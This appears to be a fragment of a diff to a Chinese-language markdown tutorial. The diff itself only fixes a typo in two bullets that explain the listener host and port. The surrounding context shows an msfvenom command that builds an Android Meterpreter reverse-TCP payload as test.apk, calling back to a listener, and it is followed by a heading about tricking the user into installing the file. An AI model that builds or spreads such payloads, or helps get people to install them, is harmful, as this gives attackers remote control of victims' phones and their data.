@@ -7,8 +7,8 @@
 ```sh
 msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.106 lport=8848 > test.apk
 ```
-* lhost 监听主角名
-* lport 监听主角端口
+* lhost 监听主机名
+* lport 监听主机端口
 
 ## 诱导安装
 
